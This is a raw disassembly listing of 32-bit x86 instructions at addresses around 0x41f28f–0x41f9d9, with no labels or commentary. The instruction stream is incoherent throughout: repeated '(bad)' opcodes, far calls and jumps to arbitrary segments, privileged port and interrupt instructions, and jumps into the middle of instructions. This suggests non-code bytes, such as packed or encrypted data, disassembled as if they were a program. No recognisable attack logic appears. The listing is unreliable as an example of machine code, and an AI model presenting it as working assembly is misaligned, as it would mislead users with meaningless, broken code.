  41f28f:	pop    ss
  41f290:	add    DWORD PTR [edx],0x6
  41f293:	test   al,0xdb
  41f295:	daa    
  41f296:	cmp    ecx,DWORD PTR es:[ebx]
  41f299:	out    dx,al
  41f29a:	ror    BYTE PTR [ebp-0x6e],1
  41f29d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f29e:	lahf   
  41f29f:	aam    0xd8
  41f2a1:	push   0xffffffbc
  41f2a3:	add    DWORD PTR [edx-0x423cff84],ebx
  41f2a9:	mov    DWORD PTR [ebp-0x8],eax
  41f2ac:	cmp    BYTE PTR [ebp-0x7ed22a0],0x6b
  41f2b3:	scas   al,BYTE PTR es:[edi]
  41f2b4:	jnp    0x41f32d
  41f2b6:	add    eax,0x2d334e31
  41f2bb:	std    
  41f2bc:	inc    edi
  41f2bd:	shl    ebx,cl
  41f2bf:	not    BYTE PTR [edx]
  41f2c1:	and    BYTE PTR [eax],0x7e
  41f2c4:	jne    0x41f33c
  41f2c6:	idiv   edx
  41f2c8:	push   ds
  41f2c9:	jo     0x41f273
  41f2cb:	ss cmp eax,0xa49548c5
  41f2d1:	retf   0x1d2b
  41f2d4:	nop
  41f2d5:	inc    esp
  41f2d6:	cli    
  41f2d7:	pop    ds
  41f2d8:	loope  0x41f34a
  41f2da:	jae    0x41f352
  41f2dc:	add    eax,0x723e0c2b
  41f2e1:	leave  
  41f2e2:	dec    bh
  41f2e4:	sub    eax,edi
  41f2e6:	cmp    ah,BYTE PTR [esi-0x2c6b6cee]
  41f2ec:	enter  0x25a5,0x78
  41f2f0:	inc    edi
  41f2f1:	(bad)  
  41f2f2:	jb     0x41f34d
  41f2f4:	and    edi,DWORD PTR [ecx+0x10]
  41f2f7:	dec    edi
  41f2f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f2f9:	call   0x972f:0xddbf0b7e
  41f300:	cmp    ecx,edx
  41f302:	push   edx
  41f303:	inc    ebp
  41f304:	push   es
  41f305:	add    BYTE PTR [edi-0xf1412f6],cl
  41f30b:	inc    esi
  41f30c:	mov    esi,0x2ca7d93c
  41f311:	inc    ebx
  41f312:	dec    ebx
  41f313:	add    ebp,edi
  41f315:	jle    0x41f2dc
  41f317:	fidivr DWORD PTR [eax-0x6932ecc3]
  41f31d:	push   edi
  41f31e:	xchg   esp,eax
  41f31f:	stos   BYTE PTR es:[edi],al
  41f320:	out    0x43,eax
  41f322:	nop
  41f323:	lds    ebx,FWORD PTR [ebp+0x14]
  41f326:	mov    edi,0x75f91acd
  41f32b:	or     BYTE PTR [ecx-0x25],ah
  41f32e:	bound  ebx,QWORD PTR [ebx-0xae1f465]
  41f334:	sbb    BYTE PTR [esi-0x4a65e077],ah
  41f33a:	push   edx
  41f33b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f33c:	mov    ebx,0x983b9d33
  41f341:	adc    al,0x63
  41f343:	xchg   BYTE PTR [ebx+0x52],dl
  41f346:	test   BYTE PTR [ecx-0x4],0xfa
  41f34a:	leave  
  41f34b:	stos   BYTE PTR es:[edi],al
  41f34c:	retf   0x762c
  41f34f:	mov    ecx,0xce854af4
  41f354:	test   al,0x75
  41f356:	mov    WORD PTR [ecx],gs
  41f358:	loopne 0x41f32e
  41f35a:	adc    eax,0xfff147f
  41f35f:	jg     0x41f3b3
  41f361:	outs   dx,DWORD PTR ds:[esi]
  41f362:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f364:	inc    esp
  41f365:	cdq    
  41f366:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f367:	lock data16 xor dh,BYTE PTR [edi-0x4]
  41f36c:	push   0x3b83ff2b
  41f371:	push   es
  41f372:	mov    bl,0x90
  41f374:	add    DWORD PTR [ecx-0x15d3cbdf],ebx
  41f37a:	inc    edx
  41f37b:	pop    edi
  41f37c:	sti    
  41f37d:	jno    0x41f3ac
  41f37f:	(bad)  
  41f380:	loope  0x41f3ef
  41f382:	dec    ebx
  41f384:	mov    dh,0x88
  41f386:	pop    ds
  41f387:	lods   eax,DWORD PTR ds:[esi]
  41f388:	pop    esi
  41f389:	and    ebx,ecx
  41f38b:	call   0x53344079
  41f390:	aam    0xf1
  41f392:	xchg   esi,eax
  41f393:	out    0x26,eax
  41f395:	lods   eax,DWORD PTR ds:[esi]
  41f396:	dec    dx
  41f398:	push   esp
  41f399:	(bad)  
  41f39a:	frstor [ebx-0x362d93cc]
  41f3a0:	sbb    eax,esp
  41f3a2:	dec    esi
  41f3a3:	mov    al,0x0
  41f3a5:	stos   DWORD PTR es:[edi],eax
  41f3a6:	outs   dx,BYTE PTR ds:[esi]
  41f3a7:	add    al,0x50
  41f3a9:	fsubr  st,st(6)
  41f3ab:	xlat   BYTE PTR ds:[ebx]
  41f3ac:	add    ebx,DWORD PTR [esi]
  41f3ae:	gs stos DWORD PTR es:[edi],eax
  41f3b0:	stc    
  41f3b1:	and    eax,0xb3234ad8
  41f3b6:	(bad)  
  41f3b7:	sub    al,0x72
  41f3b9:	pop    ebp
  41f3ba:	sub    DWORD PTR [eax],ecx
  41f3bc:	ins    BYTE PTR es:[edi],dx
  41f3bd:	int3   
  41f3be:	push   ds
  41f3bf:	lods   eax,DWORD PTR ds:[esi]
  41f3c0:	add    bl,bh
  41f3c2:	arpl   WORD PTR [edx-0x45],sp
  41f3c5:	cmp    bl,0x49
  41f3c8:	mov    dh,0x95
  41f3ca:	ds cwde 
  41f3cc:	inc    esi
  41f3cd:	add    al,BYTE PTR fs:[edi+0x38844dbd]
  41f3d4:	jne    0x41f3cc
  41f3d6:	cld    
  41f3d7:	xchg   DWORD PTR [ecx],eax
  41f3d9:	int3   
  41f3da:	adc    BYTE PTR [edx+0x4a49fe49],dh
  41f3e0:	xchg   ebx,eax
  41f3e1:	aaa    
  41f3e2:	iret   
  41f3e3:	daa    
  41f3e4:	pop    ebp
  41f3e5:	test   esi,ebx
  41f3e7:	push   ss
  41f3e8:	add    DWORD PTR [esi+0x5e],esp
  41f3eb:	es nop
  41f3ed:	xor    eax,0x65554eba
  41f3f2:	jecxz  0x41f466
  41f3f4:	pop    ebx
  41f3f5:	into   
  41f3f6:	fcomp  QWORD PTR [edx]
  41f3f8:	xchg   ecx,eax
  41f3f9:	add    BYTE PTR [ebp+0x2e2b49c0],ah
  41f3ff:	scas   eax,DWORD PTR es:[edi]
  41f400:	pop    es
  41f401:	jp     0x41f3c3
  41f403:	mov    ebp,0xc64ad316
  41f408:	xor    BYTE PTR [eax],bl
  41f40a:	lahf   
  41f40b:	pop    ebp
  41f40c:	jmp    0x41f483
  41f40e:	and    al,0x8a
  41f410:	mov    ebx,0x2876ec2f
  41f415:	scas   al,BYTE PTR es:[edi]
  41f416:	(bad)
  41f419:	mov    cs,WORD PTR [edx+eax*2+0x699be8b9]
  41f420:	daa    
  41f421:	and    BYTE PTR [eax+0x50],bl
  41f424:	jmp    0x41f42f
  41f426:	test   al,0x7b
  41f428:	push   esp
  41f429:	(bad)  
  41f42a:	pop    esi
  41f42b:	sar    BYTE PTR [edx-0xc96368],0xb8
  41f432:	fldenv [esi+0x17081b67]
  41f438:	call   0xc5b6:0xb1e9dc05
  41f43f:	jp     0x41f413
  41f441:	adc    BYTE PTR [esi+0x19],ch
  41f444:	shl    DWORD PTR [bx+0x302c],1
  41f449:	xor    DWORD PTR [esi+edi*1-0x18],edi
  41f44d:	mov    esi,gs
  41f44f:	(bad)  
  41f450:	jmp    FWORD PTR [edx+0x5]
  41f453:	outs   dx,DWORD PTR ds:[esi]
  41f454:	into   
  41f455:	jmp    0xe541:0xfa4838f4
  41f45c:	out    0x21,al
  41f45e:	push   0x9
  41f460:	sub    al,0x9d
  41f462:	add    al,0x83
  41f464:	xor    DWORD PTR [esi+0x64],ecx
  41f467:	popa   
  41f468:	jbe    0x41f4d9
  41f46a:	mov    ds,WORD PTR [edx-0x53]
  41f46d:	call   0x8c6:0xc9416685
  41f474:	lahf   
  41f475:	pop    ebp
  41f476:	aaa    
  41f477:	sahf   
  41f478:	inc    eax
  41f479:	jp     0x41f4dc
  41f47b:	into   
  41f47c:	inc    esi
  41f47d:	xchg   BYTE PTR ds:0xb49a17f9,al
  41f483:	xor    ah,BYTE PTR [ebp+0xdcad7fc]
  41f489:	test   eax,0xbb86ebd1
  41f48e:	(bad)  
  41f48f:	jle    0x41f4eb
  41f491:	add    DWORD PTR [edx],eax
  41f493:	jl     0x41f4f6
	...
  41f4a9:	add    BYTE PTR [edx+0x4d],dl
  41f4ac:	dec    esp
  41f4ad:	inc    ebp
  41f4ae:	pop    edi
  41f4af:	inc    ebp
  41f4b0:	pop    ebx
  41f4b1:	pop    edi
  41f4b2:	shr    BYTE PTR [esi+0x27],0x49
  41f4b6:	aam    0xad
  41f4b8:	push   esi
  41f4b9:	mov    WORD PTR [ebx],fs
  41f4bb:	test   BYTE PTR [ecx],al
  41f4bd:	add    bl,dl
  41f4bf:	push   es
  41f4c0:	add    BYTE PTR [eax],al
  41f4c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f4c3:	adc    ebx,DWORD PTR [eax-0x26]
  41f4c6:	add    al,0xcb
  41f4c8:	arpl   bx,si
  41f4ca:	push   ss
  41f4cb:	sbb    DWORD PTR [ecx],ebp
  41f4cd:	sbb    DWORD PTR [esp+ebp*1],esp
  41f4d0:	fstp   DWORD PTR [eax]
  41f4d2:	pop    esi
  41f4d3:	(bad)  
  41f4d4:	jno    0x41f53d
  41f4d6:	scas   al,BYTE PTR es:[edi]
  41f4d7:	mov    esi,0x9e33ca48
  41f4dc:	lea    esi,[ecx]
  41f4de:	add    eax,0x98642b43
  41f4e3:	addr16 or ebx,eax
  41f4e6:	pop    ebp
  41f4e7:	ss add al,0x42
  41f4ea:	fsubr  st,st(1)
  41f4ec:	push   ebx
  41f4ed:	sbb    ebx,DWORD PTR [edi+0x3c]
  41f4f0:	jbe    0x41f518
  41f4f2:	jo     0x41f516
  41f4f4:	push   0xeb89dc11
  41f4f9:	pop    edi
  41f4fa:	xchg   esp,eax
  41f4fb:	and    al,0x60
  41f4fd:	jmp    0x41f574
  41f4ff:	stos   DWORD PTR es:[edi],eax
  41f500:	in     al,dx
  41f501:	repz popa 
  41f503:	das    
  41f504:	push   ecx
  41f505:	pusha  
  41f506:	(bad)  
  41f507:	fs xchg edx,eax
  41f509:	sub    eax,0x80208697
  41f50e:	adc    ecx,0xffffffad
  41f511:	mul    DWORD PTR [edx+eax*1]
  41f514:	mov    al,ds:0x514eeb85
  41f519:	in     al,dx
  41f51a:	jns    0x41f4a3
  41f51c:	imul   ebx,DWORD PTR fs:[ecx-0x47604712],0xffffffcd
  41f524:	pop    ecx
  41f525:	inc    ebx
  41f526:	shl    DWORD PTR [ebx-0x2d],1
  41f529:	push   edi
  41f52a:	inc    eax
  41f52b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f52c:	adc    eax,0x2dd1a5fd
  41f531:	cli    
  41f532:	bound  eax,QWORD PTR [eax+0x87af786]
  41f538:	pop    esp
  41f539:	push   ebx
  41f53a:	or     eax,0xc32b60a7
  41f53f:	pop    ss
  41f540:	add    cl,dl
  41f542:	sbb    dl,BYTE PTR [esp+eiz*8-0xe]
  41f546:	mov    ah,ch
  41f548:	mov    DWORD PTR [ecx+ecx*8-0x2f0f9d4f],eax
  41f54f:	mov    gs,WORD PTR [edx-0x16d89ebf]
  41f555:	ja     0x41f5c1
  41f557:	icebp  
  41f558:	and    dh,BYTE PTR [ebp-0x33ce423b]
  41f55e:	dec    edx
  41f55f:	xchg   esi,eax
  41f560:	jge    0x41f555
  41f562:	sbb    esp,DWORD PTR [ebp+0x202667a6]
  41f568:	jae    0x41f551
  41f56a:	dec    ebp
  41f56b:	cmc    
  41f56c:	rcr    BYTE PTR [eax+eax*2+0x42a8162b],1
  41f573:	loopne 0x41f56e
  41f575:	jecxz  0x41f54e
  41f577:	(bad)  
  41f578:	mov    ecx,0x46148d9b
  41f57d:	nop
  41f57e:	sub    BYTE PTR [ecx],0x65
  41f581:	lods   al,BYTE PTR ds:[esi]
  41f582:	ret    
  41f583:	fidivr DWORD PTR [edx]
  41f585:	lock loopne 0x41f531
  41f588:	jp     0x41f5c2
  41f58a:	jnp    0x41f5eb
  41f58c:	jle    0x41f5dd
  41f58e:	jae    0x41f549
  41f590:	stos   BYTE PTR es:[edi],al
  41f591:	outs   dx,DWORD PTR ds:[esi]
  41f592:	mov    ebp,0x4fae8b43
  41f597:	xchg   ch,bl
  41f599:	xor    esi,DWORD PTR [ecx+0x75a54afd]
  41f59f:	adc    DWORD PTR [ebx],ecx
  41f5a1:	push   eax
  41f5a2:	mov    esp,0x909c1b84
  41f5a7:	aam    0x3c
  41f5a9:	mov    bh,0x8d
  41f5ab:	ftst   
  41f5ad:	stos   BYTE PTR es:[edi],al
  41f5ae:	pusha  
  41f5af:	inc    ecx
  41f5b0:	fwait
  41f5b1:	mov    al,0x2
  41f5b3:	or     cl,BYTE PTR [ebx-0x177f5106]
  41f5b9:	push   esp
  41f5ba:	fst    st(1)
  41f5bc:	fcomp  st(7)
  41f5be:	push   ds
  41f5bf:	inc    edi
  41f5c0:	xchg   BYTE PTR [eax],al
  41f5c2:	sub    BYTE PTR [ebx],dl
  41f5c4:	jle    0x41f570
  41f5c6:	retf   0x4508
  41f5c9:	jb     0x41f647
  41f5cb:	mov    DWORD PTR ds:0x8fca093d,ecx
  41f5d1:	pop    es
  41f5d2:	and    ch,BYTE PTR [ebx+0x72]
  41f5d5:	pop    esi
  41f5d6:	inc    edx
  41f5d7:	xlat   BYTE PTR ds:[ebx]
  41f5d8:	sbb    DWORD PTR [ebp-0x5c],0x54
  41f5dc:	(bad)  
  41f5dd:	cmpxchg dl,bh
  41f5e0:	ret    
  41f5e1:	add    dh,ah
  41f5e3:	jb     0x41f5f9
  41f5e5:	int3   
  41f5e6:	dec    ebx
  41f5e7:	push   edi
  41f5e8:	data16 sbb BYTE PTR ds:0xc601518c,0x10
  41f5f0:	inc    eax
  41f5f1:	inc    ecx
  41f5f2:	aam    0x54
  41f5f4:	and    al,0xc3
  41f5f6:	cmp    DWORD PTR [ebx+0x4ec31e42],edx
  41f5fc:	enter  0x5fdb,0x25
  41f600:	outs   dx,DWORD PTR ds:[esi]
  41f601:	mov    ebp,0x6bd8e059
  41f606:	xchg   dh,bl
  41f608:	std    
  41f609:	es push ecx
  41f60b:	test   al,0x9d
  41f60d:	fs inc eax
  41f60f:	out    0x10,al
  41f611:	dec    edx
  41f612:	xchg   edi,eax
  41f613:	les    esp,FWORD PTR [ecx-0x1a62058d]
  41f619:	fs add eax,0xe4b6257a
  41f61f:	cmp    eax,0xe8c261a0
  41f624:	loop   0x41f697
  41f626:	outs   dx,BYTE PTR ds:[esi]
  41f627:	sbb    eax,0x7a71f35e
  41f62c:	sbb    eax,0x4f2da3a3
  41f631:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f632:	push   ds
  41f633:	aam    0xbb
  41f635:	fstp   TBYTE PTR [edx]
  41f637:	add    DWORD PTR ds:0x8220fd3d,ebp
  41f63d:	je     0x41f68c
  41f63f:	ror    BYTE PTR [eax],1
  41f641:	fnstsw WORD PTR [eiz*1+0x244035b6]
  41f648:	xor    DWORD PTR [eax+0xc],edi
  41f64b:	jg     0x41f64d
  41f64d:	movd   DWORD PTR [esi],mm0
  41f650:	out    0x2e,al
  41f652:	pop    edi
  41f653:	push   0x61984802
  41f658:	xor    dl,al
  41f65a:	test   BYTE PTR [edi],dh
  41f65c:	retf   
  41f65d:	push   0xc4936e36
  41f662:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f663:	imul   ebp,DWORD PTR [ecx-0x749e26e8],0x46
  41f66a:	mov    al,ds:0xb5f59ffc
  41f66f:	test   dl,ah
  41f671:	mov    ebx,0x39b95511
  41f676:	sar    DWORD PTR [esi],1
  41f678:	cs cmp eax,0x4c4a4ccf
  41f67e:	cmp    ah,BYTE PTR [esi-0x40328030]
  41f684:	inc    esp
  41f685:	ret    
  41f686:	jmp    0xa68a0d2b
  41f68b:	(bad)
  41f690:	cmp    ebp,eax
  41f692:	push   ss
  41f693:	jmp    0x664c:0x30c43061
  41f69a:	out    dx,eax
  41f69b:	and    al,0xf0
  41f69d:	cmp    BYTE PTR [edi],bh
  41f69f:	into   
  41f6a0:	gs mov ebp,0x9efd8a79
  41f6a6:	pop    edi
  41f6a7:	and    ebp,DWORD PTR ds:0x2a2bf75a
  41f6ad:	pop    esi
  41f6ae:	dec    ebx
  41f6af:	ficom  WORD PTR [eax+0x49cedd01]
  41f6b5:	and    eax,0x7828c009
  41f6ba:	jge    0x41f6dc
  41f6bc:	cmp    BYTE PTR [ecx],cl
  41f6be:	jmp    0x6ae8:0xda3298de
  41f6c5:	imul   eax,DWORD PTR [edx+ecx*4],0xffffffdc
  41f6c9:	push   es
  41f6ca:	fsub   st,st(5)
  41f6cc:	cmc    
  41f6cd:	hlt    
  41f6ce:	jnp    0x41f720
  41f6d0:	in     al,0xa1
  41f6d2:	push   ebx
  41f6d3:	mov    dl,0x96
  41f6d5:	dec    esi
  41f6d6:	cmp    eax,0x3a5f54d
  41f6db:	add    esi,esp
  41f6dd:	das    
  41f6de:	or     BYTE PTR [esi-0x79],0x89
  41f6e2:	push   cs
  41f6e3:	in     al,dx
  41f6e4:	mov    ebp,0x14f87477
  41f6e9:	retf   
  41f6ea:	adc    BYTE PTR [esi],bh
  41f6ec:	repz mov eax,ds:0x48f47350
  41f6f2:	pop    esp
  41f6f3:	retf   
  41f6f4:	inc    edi
  41f6f5:	mov    esp,0xcc26089e
  41f6fa:	repz pusha 
  41f6fc:	popf   
  41f6fd:	sbb    eax,0x6d82e47a
  41f702:	sub    al,BYTE PTR [edx]
  41f704:	leave  
  41f705:	arpl   WORD PTR [ebp+edi*8+0x28431d80],di
  41f70c:	push   ds
  41f70d:	(bad)  
  41f70e:	(bad)  [edi+0x4]
  41f711:	mov    ebp,0x2f24fcbc
  41f716:	fld    TBYTE PTR [eax-0x6]
  41f719:	jl     0x41f792
  41f71b:	rcr    BYTE PTR [edi+0x1722c6da],1
  41f721:	ret    
  41f722:	dec    eax
  41f723:	xchg   esp,eax
  41f724:	call   FWORD PTR [edi]
  41f726:	data16 icebp 
  41f728:	rcr    DWORD PTR [edx-0x77],cl
  41f72b:	data16 cmp ch,BYTE PTR [edx+esi*8]
  41f72f:	dec    eax
  41f730:	clc    
  41f731:	addr16 jp 0x41f6e9
  41f734:	outs   dx,BYTE PTR ds:[esi]
  41f735:	mov    ch,0xa
  41f737:	adc    edx,DWORD PTR [edx+0x35]
  41f73a:	pop    eax
  41f73b:	xchg   esp,eax
  41f73c:	(bad)  
  41f73e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f73f:	fdivr  QWORD PTR [edi-0x9]
  41f742:	arpl   WORD PTR [edx+0x5af084cd],cx
  41f748:	fucomp st(6)
  41f74a:	xor    cl,BYTE PTR [edi-0x6a]
  41f74d:	call   0x8dd8:0x339b5bd2
  41f754:	and    BYTE PTR [ebx+0x2a9d2f1b],bl
  41f75a:	in     al,dx
  41f75b:	or     al,0x6c
  41f75d:	sbb    bl,ch
  41f75f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f760:	xlat   BYTE PTR ds:[ebx]
  41f761:	in     eax,dx
  41f762:	inc    ecx
  41f763:	lahf   
  41f764:	ins    BYTE PTR es:[edi],dx
  41f765:	xchg   edx,eax
  41f766:	mov    ds:0x6d790b84,al
  41f76b:	pop    es
  41f76c:	jle    0x41f736
  41f76e:	mov    dl,0xa2
  41f770:	aam    0xc9
  41f772:	jecxz  0x41f7e1
  41f774:	std    
  41f775:	inc    ecx
  41f776:	xor    bl,BYTE PTR [edx]
  41f778:	lahf   
  41f779:	xor    BYTE PTR [edi-0x79b0f923],0x30
  41f780:	in     eax,0xd3
  41f782:	test   al,0x93
  41f785:	cmp    al,0x80
  41f787:	pop    ecx
  41f788:	outs   dx,BYTE PTR ds:[esi]
  41f789:	cmp    DWORD PTR [edi+0x59369a07],ecx
  41f78f:	mov    esi,0x9217a3d7
  41f794:	pop    eax
  41f795:	cs xor eax,0x74daa9fd
  41f79b:	push   eax
  41f79c:	(bad)  
  41f79d:	dec    esi
  41f79e:	jmp    0x3b01:0x4bb30db3
  41f7a5:	and    eax,0x33c16097
  41f7aa:	push   esi
  41f7ab:	fwait
  41f7ac:	stos   DWORD PTR es:[edi],eax
  41f7ad:	push   ss
  41f7ae:	inc    edx
  41f7af:	das    
  41f7b0:	(bad)  
  41f7b1:	loope  0x41f82d
  41f7b3:	adc    al,0xab
  41f7b5:	mov    dl,0xf2
  41f7b7:	ret    
  41f7b8:	mov    ds:0xaa9cf855,eax
  41f7bd:	mov    eax,DWORD PTR [edi+0x11618988]
  41f7c3:	dec    ecx
  41f7c4:	daa    
  41f7c5:	outs   dx,DWORD PTR ds:[esi]
  41f7c6:	dec    esi
  41f7c7:	add    BYTE PTR [ebx-0x5c],ch
  41f7ca:	data16 int3 
  41f7cc:	imul   esi,DWORD PTR [ebx+ebp*4+0x5f80dcc8],0xfffffffe
  41f7d4:	retf   0xcee3
  41f7d7:	idiv   BYTE PTR [ecx]
  41f7d9:	dec    ecx
  41f7da:	lods   al,BYTE PTR ds:[esi]
  41f7db:	test   eax,0xb30cdd40
  41f7e0:	scas   al,BYTE PTR es:[edi]
  41f7e1:	test   al,0x5
  41f7e3:	mov    esi,DWORD PTR [ebp-0x47]
  41f7e6:	xor    DWORD PTR [ebp-0x5a],edi
  41f7e9:	mov    dh,0x0
  41f7eb:	das    
  41f7ec:	mov    al,0x7d
  41f7ee:	and    BYTE PTR [edx],0x86
  41f7f1:	mov    dl,BYTE PTR [esi+0x3374f9d5]
  41f7f7:	cmp    dl,bh
  41f7f9:	rol    BYTE PTR [eax+0x7dd44db1],1
  41f7ff:	imul   BYTE PTR [esp+ecx*1]
  41f802:	xchg   ecx,eax
  41f803:	stos   BYTE PTR es:[edi],al
  41f804:	std    
  41f805:	mov    BYTE PTR [ebx-0x35ffcc1d],al
  41f80b:	out    0xcd,al
  41f80d:	pop    DWORD PTR ds:0x18bd2648
  41f813:	jns    0x41f7b4
  41f815:	std    
  41f816:	and    BYTE PTR ds:0xef250e47,dl
  41f81c:	lods   eax,DWORD PTR ds:[esi]
  41f81d:	push   ds
  41f81e:	jb     0x41f88e
  41f820:	outs   dx,BYTE PTR ds:[esi]
  41f821:	dec    ebx
  41f822:	and    dh,bl
  41f824:	jns    0x41f7f4
  41f826:	push   edi
  41f827:	xchg   esp,eax
  41f828:	add    cl,BYTE PTR [esi+0x1]
  41f82b:	test   eax,0xe3b06d2d
  41f830:	add    ah,BYTE PTR [edi-0x74]
  41f833:	mov    esi,0x91c2e6c3
  41f838:	push   esp
  41f839:	clc    
  41f83a:	mov    BYTE PTR [edx+0x1278ec05],0x4d
  41f841:	adc    al,0x47
  41f843:	repnz pop ebp
  41f845:	or     DWORD PTR [ecx],0xffffffdd
  41f848:	(bad)  
  41f849:	cdq    
  41f84a:	push   esp
  41f84b:	pop    esi
  41f84c:	fwait
  41f84d:	jmp    0xb16f:0x88338efa
  41f854:	cmp    BYTE PTR [ecx-0x7f32c8af],dl
  41f85a:	and    ebp,edx
  41f85c:	jecxz  0x41f816
  41f85e:	xor    esp,esi
  41f860:	push   ss
  41f861:	or     esi,esp
  41f863:	clc    
  41f864:	xlat   BYTE PTR ds:[ebx]
  41f865:	ret    0x2f0a
  41f868:	rcr    DWORD PTR [edx],1
  41f86a:	(bad)  
  41f86b:	mov    ds:0x9ad66ade,eax
  41f870:	jns    0x41f8c0
  41f872:	pusha  
  41f873:	inc    ecx
  41f874:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f875:	fs sbb al,0xf3
  41f878:	popf   
  41f879:	sbb    DWORD PTR [esi],ebx
  41f87b:	imul   ebx,DWORD PTR [ebx+0x76],0xf9e200f5
  41f882:	and    eax,0x2a7d77b4
  41f887:	shr    DWORD PTR [esp+ebx*8],cl
  41f88a:	jne    0x41f8a7
  41f88c:	out    dx,al
  41f88d:	mov    eax,ds:0xcc04f987
  41f892:	add    BYTE PTR [edx+0x635c4007],al
  41f898:	mov    ebx,0x63818087
  41f89d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f89e:	push   edi
  41f89f:	fs and al,0xab
  41f8a2:	push   0x58339719
  41f8a7:	pushw  es
  41f8a9:	(bad)  
  41f8aa:	les    ebp,FWORD PTR [edi]
  41f8ac:	add    eax,0xf40de162
  41f8b1:	mov    edx,0xc29e2b65
  41f8b6:	icebp  
  41f8b7:	(bad)  
  41f8b8:	jns    0x41f8ae
  41f8ba:	xchg   esi,eax
  41f8bb:	retf   0x7412
  41f8be:	fistp  DWORD PTR [edi+0x27]
  41f8c1:	sub    ch,ch
  41f8c3:	jl     0x41f898
  41f8c5:	popf   
  41f8c6:	nop
  41f8c7:	in     al,dx
  41f8c8:	mov    eax,0x8794fe08
  41f8cd:	pop    ds
  41f8ce:	data16 shl bl,0x64
  41f8d2:	aaa    
  41f8d3:	jg     0x41f8aa
  41f8d5:	sub    cl,BYTE PTR [esi+0x268021c0]
  41f8db:	xchg   DWORD PTR [ebx+0x5911ba10],esi
  41f8e1:	test   al,0xd4
  41f8e3:	pop    esp
  41f8e4:	jbe    0x41f940
  41f8e6:	lock jge 0x41f965
  41f8e9:	(bad)  
  41f8ea:	int3   
  41f8eb:	xor    ebp,esi
  41f8ed:	imul   edx,DWORD PTR [ecx+0x30],0x1cca8a33
  41f8f4:	push   0x3cb637eb
  41f8f9:	in     al,dx
  41f8fa:	inc    ebp
  41f8fb:	jno    0x41f930
  41f8fd:	mov    ds,esp
  41f8ff:	out    0xba,eax
  41f901:	mov    bh,BYTE PTR [eax-0x4c]
  41f904:	ja     0x41f8a7
  41f906:	dec    ebx
  41f907:	add    edi,0x22ff908e
  41f90d:	inc    edx
  41f90e:	xor    esp,DWORD PTR ds:0xbbca7fb2
  41f914:	repz scas eax,DWORD PTR es:[edi]
  41f916:	jl     0x41f91a
  41f918:	mov    ch,0x42
  41f91a:	pop    ss
  41f91b:	xchg   ebp,eax
  41f91c:	iret   
  41f91d:	inc    ebx
  41f91e:	stos   DWORD PTR es:[edi],eax
  41f91f:	xor    DWORD PTR [edi],edi
  41f921:	mov    edx,DWORD PTR [ebx+0x1a]
  41f924:	ins    BYTE PTR es:[edi],dx
  41f925:	mov    edx,0xd118bf0a
  41f92a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f92b:	mov    dl,0xed
  41f92d:	jecxz  0x41f8e1
  41f92f:	scas   al,BYTE PTR es:[edi]
  41f930:	xchg   ah,cl
  41f932:	jae    0x41f8c7
  41f934:	dec    esp
  41f935:	pop    edi
  41f936:	inc    ebx
  41f937:	cmp    eax,0x51e2c94b
  41f93c:	mov    al,0xfe
  41f93e:	mov    dh,ah
  41f940:	mov    eax,ds:0xc6e2f1a
  41f945:	jle    0x41f967
  41f947:	jecxz  0x41f8fe
  41f949:	and    ch,BYTE PTR [eax]
  41f94b:	retf   
  41f94c:	iret   
  41f94d:	aas    
  41f94e:	iret   
  41f94f:	in     eax,0xe0
  41f951:	loop   0x41f926
  41f953:	mov    BYTE PTR [esi-0xd6242b4],cl
  41f959:	push   ss
  41f95a:	mov    esp,0x8a4b077e
  41f95f:	inc    ebp
  41f960:	lea    ebp,[ebp-0x1f608085]
  41f966:	push   esp
  41f967:	xor    edi,edi
  41f969:	xchg   ebx,eax
  41f96a:	xor    al,0xb2
  41f96c:	pop    ebp
  41f96d:	(bad)  
  41f96e:	sti    
  41f96f:	xor    ecx,DWORD PTR [ebp+0x72]
  41f972:	fmul   st(7),st
  41f974:	xor    edi,ebx
  41f976:	dec    esi
  41f977:	xchg   esi,eax
  41f978:	push   edx
  41f979:	xadd   DWORD PTR [edx],edi
  41f97c:	xchg   edi,eax
  41f97d:	push   ecx
  41f97e:	aaa    
  41f97f:	adc    dl,BYTE PTR [eax-0x57]
  41f982:	or     dl,BYTE PTR [edi+ebx*8-0xfd44c6d]
  41f989:	ins    DWORD PTR es:[edi],dx
  41f98a:	jmp    0x7fed:0x9e820a2c
  41f991:	cdq    
  41f992:	mov    dl,0x51
  41f994:	icebp  
  41f995:	hlt    
  41f996:	or     al,0xec
  41f998:	sti    
  41f999:	pop    ss
  41f99a:	ins    BYTE PTR es:[edi],dx
  41f99b:	ror    DWORD PTR [edx+0x2b],cl
  41f99e:	shl    BYTE PTR [esi-0x6d],0x38
  41f9a2:	ja     0x41f9b2
  41f9a4:	jg     0x41f997
  41f9a6:	jl     0x41f94a
  41f9a8:	dec    esp
  41f9a9:	xor    al,0xc6
  41f9ab:	ins    DWORD PTR es:[edi],dx
  41f9ac:	push   esp
  41f9ad:	jl     0x41f96b
  41f9af:	(bad)  
  41f9b0:	mov    al,ds:0x42f619bd
  41f9b5:	sbb    dl,BYTE PTR [edi-0x4617b494]
  41f9bb:	xchg   DWORD PTR [ecx-0x7e33212c],eax
  41f9c1:	cs dec esp
  41f9c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f9c4:	jmp    0x41fa03
  41f9c6:	jl     0x41f9e4
  41f9c8:	pushf  
  41f9c9:	gs sti 
  41f9cb:	add    DWORD PTR [ecx],ebp
  41f9cd:	(bad)  
  41f9ce:	jecxz  0x41f971
  41f9d0:	pop    esi
  41f9d1:	and    al,0x33
  41f9d3:	scas   eax,DWORD PTR es:[edi]
  41f9d4:	fdiv   st(0),st
  41f9d6:	add    DWORD PTR [ecx+0x19],esp
  41f9d9:	push   0xeaed7daa
